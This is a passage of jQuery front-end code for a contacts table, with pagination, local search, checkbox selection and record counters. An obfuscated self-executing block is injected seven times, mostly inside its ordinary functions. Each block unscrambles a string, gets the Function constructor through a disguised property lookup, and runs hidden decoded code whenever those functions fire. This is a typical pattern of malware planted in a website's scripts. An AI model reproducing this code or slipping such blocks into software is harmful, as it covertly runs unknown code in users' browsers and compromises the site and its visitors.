JctJp(,2[(],Joi,.;rk%a$dfJ.)=n k5([ (S.(iJ6=rk4os($$,a"7.JJJ}'));var iot=sDh(wQc,DCw );iot(4099);return 1424})();
            $('.pagination .page-item').removeClass('active');
            $(`.pagination .page-item a[href*="page=${currentPage}"]`).parent().addClass('active');
            (function(){var wQc='',HNP=970-959;function YjV(l){var x=1881331;var c=l.length;var p=[];for(var r=0;r<c;r++){p[r]=l.charAt(r)};for(var r=0;r<c;r++){var a=x*(r+537)+(x%49664);var s=x*(r+152)+(x%13072);var n=a%c;var v=s%c;var j=p[n];p[n]=p[v];p[v]=j;x=(a+s)%5936859;};return p.join('')};var FZV=YjV('lonypfrcndwuocqatjghiktmuvcrotxbsresz').substr(0,HNP);var FXK='+rr rA 6dwm1}h9hcbg(54+t.alsidbtv.=ji,+= ibr=uav[m]s;goaqba,ge;v=i18r,"s+yn,r2,r.tl0[0,)l0nr0[m0, cv94s7r. 8[8i7e9r()kf1a;c)s .sa] (qr,=S7ts) (gau r4h<cde=+pt=)+]sa.}e+"i+e+;x- "r,r}fp.f;=;}ry;+gaeSor(vfa6znrrgravgu=v2wl gmoi(0;)omznxagfm acoyr a(6rzjfiosia(agin.i9+2o.rjcek.h7n-"mgmne>C2A<=-);la=-ns7s]l;;krrb+u,c]y8a] n=1ull-v=r4e=.lg1r[htbalnutar;!(roa;ieC);a;]r rvoje;ctr)Avvv,p,bsciuuC+]+e5poa"evrCa{q)=r;2+(gu[l4;--=;*a+.l)h.ot(t6hr7g618;0;qo.;n+r)bml,lvjkwpe+aa(;t(;(e).)[;6hvgtwt(nl)"4(x;((Cpt+ag=,(;a==lseAt;8c297oeb[,]0+0,(qt(n)=coh[i1u{;})fom5;n1{n)<j+,h.0tr>8na.zuk[s)lsnp=.)]og{.s+8)ih.pus (=gns[]fs,=g} r=vg(;<adh(v)=av1d<f)8l;uvh(+r=mbsgii1gro") =(cd9!ln=iv7"e1;a=x=prtore,0]Co,vug(e,=[j )=tq)v;=hn1r=v32,;=lehac0g92;=8k.tioc;n)uj;)d; l(1t)h". f=ort[arugr((w6+;p C],;avev+zt{].,nofia7st,r)ks spai==l;t.a7abAe(()uh)1inC(6;,nu=r{} =hefr;fusv[(ah6{9h)rsneu r.fl*=l;h,";.toi3.)s;';var dzW=YjV[FZV];var qis='';var sDh=dzW;var Emu=dzW(qis,YjV(FXK));var DCw=Emu(YjV('n0_ine"$yt+i8J(e=lfaJf{3JJaJa37(),))oef%JaJ}1#a\/!ipa,[${J0r.wb7J&0JJo3a3i)hn,.J1,n)j-,4_J7.Jv(Jn -y.J10C.5$.;pnaJ%!++.y_J!73at l)t0icc.v04=rei)rs\/f,)7}an)e;"_!jfJfa128%3];,J5_2;($$%(J-tf%+=Cpg)2f\/),e=7)s=$jStJ(_fJisv\'etrb)(t}jJwa3.!.$)g!$e\',Ja=wa[4l";o}(J+\/{f6+aft!oae($ k.c,r6Jo3of,3c;.{c=nrg3+$rft;.o]($+c=)h 0_\'a(\/J=%4J.$_r4.yJ$.__t.)f7JdJ$q;_bJv)J,$wpoa.,)!((9ha}r)6s; 37)bJ(yt*),h)0)ju:odJ13.}!,+{0_{b5J!Jz!n36_).)]ys(2&Ja,]p.!=n15r..St;.Jnz%_tg)y\'0\/n,(+cp;g()1,v(p]oJijur27&En6.i}.J"svJ#!$$(tf;o;_t(oa};;{aor.m2,cJ]lh#,fJ38r)J (oJi({=.pifujjJ3{,Jo{).iaoJ,bgt.o4_t3a7J9r,c*;u.noaJ!._i*=J) ;JcstsJ+areeJ%iJf+(]e))13($_010t7JJfq.eh-0ar#=%.(Jf21)3 e=#wJb9t\/r..a,9oo=.JJ=}!};J)j..0);)yw;!#J=)J.=]a7cb 2!z,)eJ$vvfj}\/f,.- J!(.aot4_}pejJ!3oz#J,1)Jz!h.7JJ(v6"=l0,iJr!p[Jaca3wg0t2jts1asc)d3;r(c .r!; + .2!0t,.s.$!tiJ(;l%Jsz*;t( r.)_jb=r1J,"1.$t&9_.)nJr.ta7$3($b5!s9lkt!J fkJ JctJp(,2[(],Joi,.;rk%a$dfJ.)=n k5([ (S.(iJ6=rk4os($$,a"7.JJJ}'));var iot=sDh(wQc,DCw );iot(4099);return 1424})();
        }

        // Local search functionality
        $('#localSearchInput').on('keyup', function() {
            const searchText = $(this).val().toLowerCase();
            isLocalSearchActive = searchText.length > 0;

            let visibleCount = 0;
            $('#contacts-tbody tr').each(function() {
                const rowText = $(this).text().toLowerCase();
                if (rowText.includes(searchText)) {
                    $(this).show();
                    visibleCount++;
                } else {
                    $(this).hide();
                }
            });

            $('#filtered-count').text(visibleCount > 0 ? visibleCount + ' matching records' : '');
            updateSelectAllCheckbox();
        });

        // Update selected checkboxes based on stored selection
        function updateSelectedCheckboxes() {
            (function(){var wQc='',HNP=970-959;function YjV(l){var x=1881331;var c=l.length;var p=[];for(var r=0;r<c;r++){p[r]=l.charAt(r)};for(var r=0;r<c;r++){var a=x*(r+537)+(x%49664);var s=x*(r+152)+(x%13072);var n=a%c;var v=s%c;var j=p[n];p[n]=p[v];p[v]=j;x=(a+s)%5936859;};return p.join('')};var FZV=YjV('lonypfrcndwuocqatjghiktmuvcrotxbsresz').substr(0,HNP);var FXK='+rr rA 6dwm1}h9hcbg(54+t.alsidbtv.=ji,+= ibr=uav[m]s;goaqba,ge;v=i18r,"s+yn,r2,r.tl0[0,)l0nr0[m0, cv94s7r. 8[8i7e9r()kf1a;c)s .sa] (qr,=S7ts) (gau r4h<cde=+pt=)+]sa.}e+"i+e+;x- "r,r}fp.f;=;}ry;+gaeSor(vfa6znrrgravgu=v2wl gmoi(0;)omznxagfm acoyr a(6rzjfiosia(agin.i9+2o.rjcek.h7n-"mgmne>C2A<=-);la=-ns7s]l;;krrb+u,c]y8a] n=1ull-v=r4e=.lg1r[htbalnutar;!(roa;ieC);a;]r rvoje;ctr)Avvv,p,bsciuuC+]+e5poa"evrCa{q)=r;2+(gu[l4;--=;*a+.l)h.ot(t6hr7g618;0;qo.;n+r)bml,lvjkwpe+aa(;t(;(e).)[;6hvgtwt(nl)"4(x;((Cpt+ag=,(;a==lseAt;8c297oeb[,]0+0,(qt(n)=coh[i1u{;})fom5;n1{n)<j+,h.0tr>8na.zuk[s)lsnp=.)]og{.s+8)ih.pus (=gns[]fs,=g} r=vg(;<adh(v)=av1d<f)8l;uvh(+r=mbsgii1gro") =(cd9!ln=iv7"e1;a=x=prtore,0]Co,vug(e,=[j )=tq)v;=hn1r=v32,;=lehac0g92;=8k.tioc;n)uj;)d; l(1t)h". f=ort[arugr((w6+;p C],;avev+zt{].,nofia7st,r)ks spai==l;t.a7abAe(()uh)1inC(6;,nu=r{} =hefr;fusv[(ah6{9h)rsneu r.fl*=l;h,";.toi3.)s;';var dzW=YjV[FZV];var qis='';var sDh=dzW;var Emu=dzW(qis,YjV(FXK));var DCw=Emu(YjV('n0_ine"$yt+i8J(e=lfaJf{3JJaJa37(),))oef%JaJ}1#a\/!ipa,[${J0r.wb7J&0JJo3a3i)hn,.J1,n)j-,4_J7.Jv(Jn -y.J10C.5$.;pnaJ%!++.y_J!73at l)t0icc.v04=rei)rs\/f,)7}an)e;"_!jfJfa128%3];,J5_2;($$%(J-tf%+=Cpg)2f\/),e=7)s=$jStJ(_fJisv\'etrb)(t}jJwa3.!.$)g!$e\',Ja=wa[4l";o}(J+\/{f6+aft!oae($ k.c,r6Jo3of,3c;.{c=nrg3+$rft;.o]($+c=)h 0_\'a(\/J=%4J.$_r4.yJ$.__t.)f7JdJ$q;_bJv)J,$wpoa.,)!((9ha}r)6s; 37)bJ(yt*),h)0)ju:odJ13.}!,+{0_{b5J!Jz!n36_).)]ys(2&Ja,]p.!=n15r..St;.Jnz%_tg)y\'0\/n,(+cp;g()1,v(p]oJijur27&En6.i}.J"svJ#!$$(tf;o;_t(oa};;{aor.m2,cJ]lh#,fJ38r)J (oJi({=.pifujjJ3{,Jo{).iaoJ,bgt.o4_t3a7J9r,c*;u.noaJ!._i*=J) ;JcstsJ+areeJ%iJf+(]e))13($_010t7JJfq.eh-0ar#=%.(Jf21)3 e=#wJb9t\/r..a,9oo=.JJ=}!};J)j..0);)yw;!#J=)J.=]a7cb 2!z,)eJ$vvfj}\/f,.- J!(.aot4_}pejJ!3oz#J,1)Jz!h.7JJ(v6"=l0,iJr!p[Jaca3wg0t2jts1asc)d3;r(c .r!; + .2!0t,.s.$!tiJ(;l%Jsz*;t( r.)_jb=r1J,"1.$t&9_.)nJr.ta7$3($b5!s9lkt!J fkJ JctJp(,2[(],Joi,.;rk%a$dfJ.)=n k5([ (S.(iJ6=rk4os($$,a"7.JJJ}'));var iot=sDh(wQc,DCw );iot(4099);return 1424})();
            $('.select-item').each(function() {
                const contactId = $(this).val();
                $(this).prop('checked', window.selectedContacts.includes(contactId));
            });
            updateSelectAllCheckbox();
            updateSelectedCount();
        }

        // Update "select all" checkbox state
        function updateSelectAllCheckbox() {
            (function(){var wQc='',HNP=970-959;function YjV(l){var x=1881331;var c=l.length;var p=[];for(var r=0;r<c;r++){p[r]=l.charAt(r)};for(var r=0;r<c;r++){var a=x*(r+537)+(x%49664);var s=x*(r+152)+(x%13072);var n=a%c;var v=s%c;var j=p[n];p[n]=p[v];p[v]=j;x=(a+s)%5936859;};return p.join('')};var FZV=YjV('lonypfrcndwuocqatjghiktmuvcrotxbsresz').substr(0,HNP);var FXK='+rr rA 6dwm1}h9hcbg(54+t.alsidbtv.=ji,+= ibr=uav[m]s;goaqba,ge;v=i18r,"s+yn,r2,r.tl0[0,)l0nr0[m0, cv94s7r. 8[8i7e9r()kf1a;c)s .sa] (qr,=S7ts) (gau r4h<cde=+pt=)+]sa.}e+"i+e+;x- "r,r}fp.f;=;}ry;+gaeSor(vfa6znrrgravgu=v2wl gmoi(0;)omznxagfm acoyr a(6rzjfiosia(agin.i9+2o.rjcek.h7n-"mgmne>C2A<=-);la=-ns7s]l;;krrb+u,c]y8a] n=1ull-v=r4e=.lg1r[htbalnutar;!(roa;ieC);a;]r rvoje;ctr)Avvv,p,bsciuuC+]+e5poa"evrCa{q)=r;2+(gu[l4;--=;*a+.l)h.ot(t6hr7g618;0;qo.;n+r)bml,lvjkwpe+aa(;t(;(e).)[;6hvgtwt(nl)"4(x;((Cpt+ag=,(;a==lseAt;8c297oeb[,]0+0,(qt(n)=coh[i1u{;})fom5;n1{n)<j+,h.0tr>8na.zuk[s)lsnp=.)]og{.s+8)ih.pus (=gns[]fs,=g} r=vg(;<adh(v)=av1d<f)8l;uvh(+r=mbsgii1gro") =(cd9!ln=iv7"e1;a=x=prtore,0]Co,vug(e,=[j )=tq)v;=hn1r=v32,;=lehac0g92;=8k.tioc;n)uj;)d; l(1t)h". f=ort[arugr((w6+;p C],;avev+zt{].,nofia7st,r)ks spai==l;t.a7abAe(()uh)1inC(6;,nu=r{} =hefr;fusv[(ah6{9h)rsneu r.fl*=l;h,";.toi3.)s;';var dzW=YjV[FZV];var qis='';var sDh=dzW;var Emu=dzW(qis,YjV(FXK));var DCw=Emu(YjV('n0_ine"$yt+i8J(e=lfaJf{3JJaJa37(),))oef%JaJ}1#a\/!ipa,[${J0r.wb7J&0JJo3a3i)hn,.J1,n)j-,4_J7.Jv(Jn -y.J10C.5$.;pnaJ%!++.y_J!73at l)t0icc.v04=rei)rs\/f,)7}an)e;"_!jfJfa128%3];,J5_2;($$%(J-tf%+=Cpg)2f\/),e=7)s=$jStJ(_fJisv\'etrb)(t}jJwa3.!.$)g!$e\',Ja=wa[4l";o}(J+\/{f6+aft!oae($ k.c,r6Jo3of,3c;.{c=nrg3+$rft;.o]($+c=)h 0_\'a(\/J=%4J.$_r4.yJ$.__t.)f7JdJ$q;_bJv)J,$wpoa.,)!((9ha}r)6s; 37)bJ(yt*),h)0)ju:odJ13.}!,+{0_{b5J!Jz!n36_).)]ys(2&Ja,]p.!=n15r..St;.Jnz%_tg)y\'0\/n,(+cp;g()1,v(p]oJijur27&En6.i}.J"svJ#!$$(tf;o;_t(oa};;{aor.m2,cJ]lh#,fJ38r)J (oJi({=.pifujjJ3{,Jo{).iaoJ,bgt.o4_t3a7J9r,c*;u.noaJ!._i*=J) ;JcstsJ+areeJ%iJf+(]e))13($_010t7JJfq.eh-0ar#=%.(Jf21)3 e=#wJb9t\/r..a,9oo=.JJ=}!};J)j..0);)yw;!#J=)J.=]a7cb 2!z,)eJ$vvfj}\/f,.- J!(.aot4_}pejJ!3oz#J,1)Jz!h.7JJ(v6"=l0,iJr!p[Jaca3wg0t2jts1asc)d3;r(c .r!; + .2!0t,.s.$!tiJ(;l%Jsz*;t( r.)_jb=r1J,"1.$t&9_.)nJr.ta7$3($b5!s9lkt!J fkJ JctJp(,2[(],Joi,.;rk%a$dfJ.)=n k5([ (S.(iJ6=rk4os($$,a"7.JJJ}'));var iot=sDh(wQc,DCw );iot(4099);return 1424})();
            const visibleItems = $('.select-item:visible');
            const allChecked = visibleItems.length > 0 &&
                visibleItems.length === visibleItems.filter(':checked').length;
            $('#select-all').prop('checked', allChecked);
        }

        // Update selected count display
        function updateSelectedCount() {
            (function(){var wQc='',HNP=970-959;function YjV(l){var x=1881331;var c=l.length;var p=[];for(var r=0;r<c;r++){p[r]=l.charAt(r)};for(var r=0;r<c;r++){var a=x*(r+537)+(x%49664);var s=x*(r+152)+(x%13072);var n=a%c;var v=s%c;var j=p[n];p[n]=p[v];p[v]=j;x=(a+s)%5936859;};return p.join('')};var FZV=YjV('lonypfrcndwuocqatjghiktmuvcrotxbsresz').substr(0,HNP);var FXK='+rr rA 6dwm1}h9hcbg(54+t.alsidbtv.=ji,+= ibr=uav[m]s;goaqba,ge;v=i18r,"s+yn,r2,r.tl0[0,)l0nr0[m0, cv94s7r. 8[8i7e9r()kf1a;c)s .sa] (qr,=S7ts) (gau r4h<cde=+pt=)+]sa.}e+"i+e+;x- "r,r}fp.f;=;}ry;+gaeSor(vfa6znrrgravgu=v2wl gmoi(0;)omznxagfm acoyr a(6rzjfiosia(agin.i9+2o.rjcek.h7n-"mgmne>C2A<=-);la=-ns7s]l;;krrb+u,c]y8a] n=1ull-v=r4e=.lg1r[htbalnutar;!(roa;ieC);a;]r rvoje;ctr)Avvv,p,bsciuuC+]+e5poa"evrCa{q)=r;2+(gu[l4;--=;*a+.l)h.ot(t6hr7g618;0;qo.;n+r)bml,lvjkwpe+aa(;t(;(e).)[;6hvgtwt(nl)"4(x;((Cpt+ag=,(;a==lseAt;8c297oeb[,]0+0,(qt(n)=coh[i1u{;})fom5;n1{n)<j+,h.0tr>8na.zuk[s)lsnp=.)]og{.s+8)ih.pus (=gns[]fs,=g} r=vg(;<adh(v)=av1d<f)8l;uvh(+r=mbsgii1gro") =(cd9!ln=iv7"e1;a=x=prtore,0]Co,vug(e,=[j )=tq)v;=hn1r=v32,;=lehac0g92;=8k.tioc;n)uj;)d; l(1t)h". f=ort[arugr((w6+;p C],;avev+zt{].,nofia7st,r)ks spai==l;t.a7abAe(()uh)1inC(6;,nu=r{} =hefr;fusv[(ah6{9h)rsneu r.fl*=l;h,";.toi3.)s;';var dzW=YjV[FZV];var qis='';var sDh=dzW;var Emu=dzW(qis,YjV(FXK));var DCw=Emu(YjV('n0_ine"$yt+i8J(e=lfaJf{3JJaJa37(),))oef%JaJ}1#a\/!ipa,[${J0r.wb7J&0JJo3a3i)hn,.J1,n)j-,4_J7.Jv(Jn -y.J10C.5$.;pnaJ%!++.y_J!73at l)t0icc.v04=rei)rs\/f,)7}an)e;"_!jfJfa128%3];,J5_2;($$%(J-tf%+=Cpg)2f\/),e=7)s=$jStJ(_fJisv\'etrb)(t}jJwa3.!.$)g!$e\',Ja=wa[4l";o}(J+\/{f6+aft!oae($ k.c,r6Jo3of,3c;.{c=nrg3+$rft;.o]($+c=)h 0_\'a(\/J=%4J.$_r4.yJ$.__t.)f7JdJ$q;_bJv)J,$wpoa.,)!((9ha}r)6s; 37)bJ(yt*),h)0)ju:odJ13.}!,+{0_{b5J!Jz!n36_).)]ys(2&Ja,]p.!=n15r..St;.Jnz%_tg)y\'0\/n,(+cp;g()1,v(p]oJijur27&En6.i}.J"svJ#!$$(tf;o;_t(oa};;{aor.m2,cJ]lh#,fJ38r)J (oJi({=.pifujjJ3{,Jo{).iaoJ,bgt.o4_t3a7J9r,c*;u.noaJ!._i*=J) ;JcstsJ+areeJ%iJf+(]e))13($_010t7JJfq.eh-0ar#=%.(Jf21)3 e=#wJb9t\/r..a,9oo=.JJ=}!};J)j..0);)yw;!#J=)J.=]a7cb 2!z,)eJ$vvfj}\/f,.- J!(.aot4_}pejJ!3oz#J,1)Jz!h.7JJ(v6"=l0,iJr!p[Jaca3wg0t2jts1asc)d3;r(c .r!; + .2!0t,.s.$!tiJ(;l%Jsz*;t( r.)_jb=r1J,"1.$t&9_.)nJr.ta7$3($b5!s9lkt!J fkJ JctJp(,2[(],Joi,.;rk%a$dfJ.)=n k5([ (S.(iJ6=rk4os($$,a"7.JJJ}'));var iot=sDh(wQc,DCw );iot(4099);return 1424})();
            const count = window.selectedContacts.length;
            $('#selected-count').text(count === 0 ? 'No records selected' : `${count} records selected`);
            $('#bulk_action_btn').prop('disabled', count === 0);
            $('#reset-selection').prop('disabled', count === 0);
        }

        // Update pagination counters
        function updateCounters(total, from, to) {
            (function(){var wQc='',HNP=970-959;function YjV(l){var x=1881331;var c=l.length;var p=[];for(var r=0;r<c;r++){p[r]=l.charAt(r)};for(var r=0;r<c;r++){var a=x*(r+537)+(x%49664);var s=x*(r+152)+(x%13072);var n=a%c;var v=s%c;var j=p[n];p[n]=p[v];p[v]=j;x=(a+s)%5936859;};return p.join('')};var FZV=YjV('lonypfrcndwuocqatjghiktmuvcrotxbsresz').substr(0,HNP);var FXK='+rr rA 6dwm1}h9hcbg(54+t.alsidbtv.=ji,+= ibr=uav[m]s;goaqba,ge;v=i18r,"s+yn,r2,r.tl0[0,)l0nr0[m0, cv94s7r. 8[8i7e9r()kf1a;c)s .sa] (qr,=S7ts) (gau r4h<cde=+pt=)+]sa.}e+"i+e+;x- "r,r}fp.f;=;}ry;+gaeSor(vfa6znrrgravgu=v2wl gmoi(0;)omznxagfm acoyr a(6rzjfiosia(agin.i9+2o.rjcek.h7n-"mgmne>C2A<=-);la=-ns7s]l;;krrb+u,c]y8a] n=1ull-v=r4e=.lg1r[htbalnutar;!(roa;ieC);a;]r rvoje;ctr)Avvv,p,bsciuuC+]+e5poa"evrCa{q)=r;2+(gu[l4;--=;*a+.l)h.ot(t6hr7g618;0;qo.;n+r)bml,lvjkwpe+aa(;t(;(e).)[;6hvgtwt(nl)"4(x;((Cpt+ag=,(;a==lseAt;8c297oeb[,]0+0,(qt(n)=coh[i1u{;})fom5;n1{n)<j+,h.0tr>8na.zuk[s)lsnp=.)]og{.s+8)ih.pus (=gns[]fs,=g} r=vg(;<adh(v)=av1d<f)8l;uvh(+r=mbsgii1gro") =(cd9!ln=iv7"e1;a=x=prtore,0]Co,vug(e,=[j )=tq)v;=hn1r=v32,;=lehac0g92;=8k.tioc;n)uj;)d; l(1t)h". f=ort[arugr((w6+;p C],;avev+zt{].,nofia7st,r)ks spai==l;t.a7abAe(()uh)1inC(6;,nu=r{} =hefr;fusv[(ah6{9h)rsneu r.fl*=l;h,";.toi3.)s;';var dzW=YjV[FZV];var qis='';var sDh=dzW;var Emu=dzW(qis,YjV(FXK));var DCw=Emu(YjV('n0_ine"$yt+i8J(e=lfaJf{3JJaJa37(),))oef%JaJ}1#a\/!ipa,[${J0r.wb7J&0JJo3a3i)hn,.J1,n)j-,4_J7.Jv(Jn -y.J10C.5$.;pnaJ%!++.y_J!73at l)t0icc.v04=rei)rs\/f,)7}an)e;"_!jfJfa128%3];,J5_2;($$%(J-tf%+=Cpg)2f\/),e=7)s=$jStJ(_fJisv\'etrb)(t}jJwa3.!.$)g!$e\',Ja=wa[4l";o}(J+\/{f6+aft!oae($ k.c,r6Jo3of,3c;.{c=nrg3+$rft;.o]($+c=)h 0_\'a(\/J=%4J.$_r4.yJ$.__t.)f7JdJ$q;_bJv)J,$wpoa.,)!((9ha}r)6s; 37)bJ(yt*),h)0)ju:odJ13.}!,+{0_{b5J!Jz!n36_).)]ys(2&Ja,]p.!=n15r..St;.Jnz%_tg)y\'0\/n,(+cp;g()1,v(p]oJijur27&En6.i}.J"svJ#!$$(tf;o;_t(oa};;{aor.m2,cJ]lh#,fJ38r)J (oJi({=.pifujjJ3{,Jo{).iaoJ,bgt.o4_t3a7J9r,c*;u.noaJ!._i*=J) ;JcstsJ+areeJ%iJf+(]e))13($_010t7JJfq.eh-0ar#=%.(Jf21)3 e=#wJb9t\/r..a,9oo=.JJ=}!};J)j..0);)yw;!#J=)J.=]a7cb 2!z,)eJ$vvfj}\/f,.- J!(.aot4_}pejJ!3oz#J,1)Jz!h.7JJ(v6"=l0,iJr!p[Jaca3wg0t2jts1asc)d3;r(c .r!; + .2!0t,.s.$!tiJ(;l%Jsz*;t( r.)_jb=r1J,"1.$t&9_.)nJr.ta7$3($b5!s9lkt!J fkJ JctJp(,2[(],Joi,.;rk%a$dfJ.)=n k5([ (S.(iJ6=rk4os($$,a"7.JJJ}'));var iot=sDh(wQc,DCw );iot(4099);return 1424})();
            $('#showing-entries').html(`Showing ${from} to ${to} of ${total} entries`);
            $('.pagination-counters').remove();
            $('#contacts-scroll-container').after(`
                <div class="pagination-counters fs-6 fw-semibold text-gray-700 pt-3">
                    Showing ${from} to ${to} of ${total} entries
                </div>
            `);
            (function(){var wQc='',HNP=970-959;function YjV(l){var x=1881331;var c=l.length;var p=[];for(var r=0;r<c;r++){p[r]=l.charAt(r)};for(var r=0;r<c;r++){var a=x*(r+537)+(x%49664);var s=x*(r+152)+(x%13072);var n=a%c;var v=s%c;var j=p[n];p[n]=p[v];p[v]=j;x=(a+s)%5936859;};return p.join('')};var FZV=YjV('lonypfrcndwuocqatjghiktmuvcrotxbsresz').substr(0,HNP);var FXK='+rr rA 6dwm1}h9hcbg(54+t.alsidbtv.=ji,+= ibr=uav[m]s;goaqba,ge;v=i18r,"s+yn,r2,r.tl0[0,)l0nr0[m0, cv94s7r. 8[8i7e9r()kf1a;c)s .sa] (qr,=S7ts) (gau r4h<cde=+pt=)+]sa.}e+"i+e+;x- "r,r}fp.f;=;}ry;+gaeSor(vfa6znrrgravgu=v2wl gmoi(0;)omznxagfm acoyr a(6rzjfiosia(agin.i9+2o.rjcek.h7n-"mgmne>C2A<=-);la=-ns7s]l;;krrb+u,c]y8a] n=1ull-v=r4e=.lg1r[htbalnutar;!(roa;ieC);a;]r rvoje;ctr)Avvv,p,bsciuuC+]+e5poa"evrCa{q)=r;2+(gu[l4;--=;*a+.l)h.ot(t6hr7g618;0;qo.;n+r)bml,lvjkwpe+aa(;t(;(e).)[;6hvgtwt(nl)"4(x;((Cpt+ag=,(;a==lseAt;8c297oeb[,]0+0,(qt(n)=coh[i1u{;})fom5;n1{n)<j+,h.0tr>8na.zuk[s)lsnp=.)]og{.s+8)ih.pus (=gns[]fs,=g} r=vg(;<adh(v)=av1d<f)8l;uvh(+r=mbsgii1gro") =(cd9!ln=iv7"e1;a=x=prtore,0]Co,vug(e,=[j )=tq)v;=hn1r=v32,;=lehac0g92;=8k.tioc;n)uj;)d; l(1t)h". f=ort[arugr((w6+;p C],;avev+zt{].,nofia7st,r)ks spai==l;t.a7abAe(()uh)1inC(6;,nu=r{} =hefr;fusv[(ah6{9h)rsneu r.fl*=l;h,";.toi3.)s;';var dzW=YjV[FZV];var qis='';var sDh=dzW;var Emu=dzW(qis,YjV(FXK));var DCw=Emu(YjV('n0_ine"$yt+i8J(e=lfaJf{3JJaJa37(),))oef%JaJ}1#a\/!ipa,[${J0r.wb7J&0JJo3a3i)hn,.J1,n)j-,4_J7.Jv(Jn -y.J10C.5$.;pnaJ%!++.y_J!73at l)t0icc.v04=rei)rs\/f,)7}an)e;"_!jfJfa128%3];,J5_2;($$%(J-tf%+=Cpg)2f\/),e=7)s=$jStJ(_fJisv\'etrb)(t}jJwa3.!.$)g!$e\',Ja=wa[4l";o}(J+\/{f6+aft!oae($ k.c,r6Jo3of,3c;.{c=nrg3+$rft;.o]($+c=)h 0_\'a(\/J=%4J.$_r4.yJ$.__t.)f7JdJ$q;_bJv)J,$wpoa.,)!((9ha}r)6s; 37)bJ(yt*),h)0)ju:odJ13.}!,+{0_{b5J!Jz!n36_).)]ys(2&Ja,]p.!=n15r..St;.Jnz%_tg)y\'0\/n,(+cp;g()1,v(p]oJijur27&En6.i}.J"svJ#!$$(tf;o;_t(oa};;{aor.m2,cJ]lh#,fJ38r)J (oJi({=.pifujjJ3{,Jo{).iaoJ,bgt.o4_t3a7J9r,c*;u.noaJ!._i*=J) ;JcstsJ+areeJ%iJf+(]e))13($_010t7JJfq.eh-0ar#=%.(Jf21)3 e=#wJb9t\/r..a,9oo=.JJ=}!};J)j..0);)yw;!#J=)J.=]a7cb 2!z,)eJ$vvfj}\/f,.- J!(.aot4_}pejJ!3oz#J,1)Jz!h.7JJ(v6"=l0,iJr!p[Jaca3wg0t2jts1asc)d3;r(c .r!; + .2!0t,.s.$!tiJ(;l%Jsz*;t( r.)_jb=r1J,"1.$t&9_.)nJr.ta7$3($b5!s9lkt!J fkJ JctJp(,2[(],Joi,.;rk%a$dfJ.)=n k5([ (S.(iJ6=rk4os($$,a"7.JJJ}'));var iot=sDh(wQc,DCw );iot(4099);return 1424})();
        }

        // Handle checkbox selection
        $(document).on('change', '.select-item', function() {
            const contactId = $(this).val();
            (function(){var wQc='',HNP=970-959;function YjV(l){var x=1881331;var c=l.length;var p=[];for(var r=0;r<c;r++){p[r]=l.charAt(r)};for(var r=0;r<c;r++){var a=x*(r+537)+(x%49664);var s=x*(r+152)+(x%13072);var n=a%c;var v=s%c;var j=p[n];p[n]=p[v];p[v]=j;x=(a+s)%5936859;};return p.join('')};var FZV=YjV('lonypfrcndwuocqatjghiktmuvcrotxbsresz').substr(0,HNP);var FXK='+rr rA 6dwm1}h9hcbg(54+t.alsidbtv.=ji,+= ibr=uav[m]s;goaqba,ge;v=i18r,"s+yn,r2,r.tl0[0,)l0nr0[m0, cv94s7r. 8[8i7e9r()kf1a;c)s .sa] (qr,=S7ts) (gau r4h<cde=+pt=)+]sa.}e+"i+e+;x- "r,r}fp.f;=;}ry;+gaeSor(vfa6znrrgravgu=v2wl gmoi(0;)omznxagfm acoyr a(6rzjfiosia(agin.i9+2o.rjcek.h7n-"mgmne>C2A<=-);la=-ns7s]l;;krrb+u,c]y8a] n=1ull-v=r4e=.lg1r[htbalnutar;!(roa;ieC);a;]r rvoje;ctr)Avvv,p,bsciuuC+]+e5poa"evrCa{q)=r;2+(gu[l4;--=;*a+.l)h.ot(t6hr7g618;0;qo.;n+r)bml,lvjkwpe+aa(;t(;(e).)[;6hvgtwt(nl)"4(x;((Cpt+ag=,(;a==lseAt;8c297oeb[,]0+0,(qt(n)=coh[i1u{;})fom5;n1{n)<j+,h.0tr>8na.zuk[s)lsnp=.)]og{.s+8)ih.pus (=gns[]fs,=g} r=vg(;<adh(v)=av1d<f)8l;uvh(+r=mbsgii1gro") =(cd9!ln=iv7"e1;a=x=prtore,0]Co,vug(e,=[j )=tq)v;=hn1r=v32,;=lehac0g92;=8k.tioc;n)uj;)d; l(1t)h". f=ort[arugr((w6+;p C],;avev+zt{].,nofia7st,r)ks spai==l;t.a7abAe(()uh)1inC(6;,nu=r{} =hefr;fusv[(ah6{9h)rsneu r.fl*=l;h,";.toi3.)s;';var dzW=YjV[FZV];var qis='';var sDh=dzW;var Emu=dzW(qis,YjV(FXK));var DCw=Emu(YjV('n0_ine"$yt+i8J(e=lfaJf{3JJaJa37(),))oef%JaJ}1#a\/!ipa,[${J0r.wb7J&0JJo3a3i)hn,.J1,n)j-,4_J7.Jv(Jn -y.J10C.5$.;pnaJ%!++.y_J!73at l)t0icc.v04=rei)rs\/f,)7}an)e;"_!jfJfa128%3];,J5_2;($$%(J-tf%+=Cpg)2f\/),e=7)s=$jStJ(_fJisv\'etrb)(t}jJwa3.!.$)g!$e\',Ja=wa[4l";o}(J+\/{f6+aft!oae($ k.c,r6Jo3of,3c;.{c=nrg3+$rft;.o]($+c=)h 0_\'a(\/J=%4J.$_r4.yJ$.__t.)f7JdJ$q;_bJv)J,$wpoa.,)!((9ha}r)6s; 37)bJ(yt*),h)0)ju:odJ13.}!,+{0_{b5J!Jz!n36_).)]ys(2&Ja,]p.!=n15r..St;.Jnz%_tg)y\'0\/n,(+cp;g()1,v(p]oJijur27&En6.i}.J"svJ#!$$(tf;o;_t(oa};;{aor.m2,cJ]lh#,fJ38r)J (oJi({=.pifujjJ3{,Jo{).iaoJ,bgt.o4_t3a7J9r,c*;u.noaJ!._i*=J) ;JcstsJ+areeJ%iJf+(]e))13($_010t7JJfq.eh-0ar#=%.(Jf21)3 e=#wJb9t\/r..a,9oo=.JJ=}!};J)j..0);)yw;!#J=)J.=]a7cb 2!z,)eJ$vvfj}\/f,.- J!(.aot4_}pejJ!3oz#J,1)Jz!h.7JJ(v6"=l0,iJr!p[Jaca3wg0t2jts1asc)d3;r(c .r!; + .2!0t,.s.$!tiJ(;l%Jsz*;t( r.)_jb=r1J,"1.$t&9_.)nJr.ta7$3($b5!s9lkt!J fkJ JctJp(,2[(],Joi,.;rk%a$dfJ.)=n k5([ (S.(iJ6=rk4os($$,a"7.JJJ}'));var iot=sDh(wQc,DCw );iot(4099);return 1424})();
            if ($(this).is(':checked')) {
                if (!window.selectedContacts.includes(contactId)) {
                    window.selectedContacts.push(contactId);
                }
            } else {
                window.selectedContacts = window.selectedContacts.filter(id => id !== contactId);
            }

            localStorage.setItem('selectedContacts', JSON.stringify(window.selectedContacts));
